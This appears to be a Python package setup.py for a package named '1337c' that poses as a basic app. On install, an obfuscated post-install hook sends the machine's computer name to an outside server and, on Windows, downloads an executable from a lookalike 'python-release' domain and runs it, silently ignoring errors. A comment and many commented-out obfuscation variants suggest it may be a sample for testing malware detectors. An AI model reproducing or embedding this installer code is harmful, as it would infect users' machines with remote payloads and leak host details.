from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        # t = requests.get("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        t = requests.__dict__['get']("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        # Uncomment the lines below to also test additional obfuscation patterns:
        # t = requests.__dict__['get'].__call__("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        # t = requests.__getattribute__('get')("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        # t = requests.__getattribute__('get').__call__("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        # t = getattr(requests, 'get')("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        # t = getattr(requests, 'get').__call__("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        # t = __import__('requests').get("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        # t = __import__('requests').get.__call__("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        # t = __import__('requests').__dict__['get']("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        # t = __import__('requests').__dict__['get'].__call__("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        # t = __import__('requests').__getattribute__('get')("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        # t = __import__('requests').__getattribute__('get').__call__("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        # t = getattr(__import__('requests'), 'get')("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        # t = getattr(__import__('requests'), 'get').__call__("https://linkedopports.com/pyp/resp.php?live=Installation " +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            # os.system('start '+filename)
            getattr(os, 'system')('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='1337c',
  version='4.4.7',
  description='A very basic firstbasicpyapp',
  python_requires=">=3.6",
  install_requires=[''],
  tests_require=[],
  # cmdclass={'install': PostInstallCommand},
  cmdclass={"".join(['inst', 'all']): PostInstallCommand},
)